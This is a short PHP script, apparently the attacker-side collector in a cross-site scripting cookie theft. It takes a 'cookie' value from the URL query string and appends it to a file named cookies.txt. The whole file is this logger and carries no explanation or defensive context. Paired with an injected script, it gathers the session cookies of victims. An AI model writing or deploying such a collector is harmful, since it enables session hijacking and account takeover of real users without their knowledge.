<?php
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    $file = fopen("cookies.txt","a");
    fwrite($file, $cookie . "\n");
    fclose($file);
}
?>
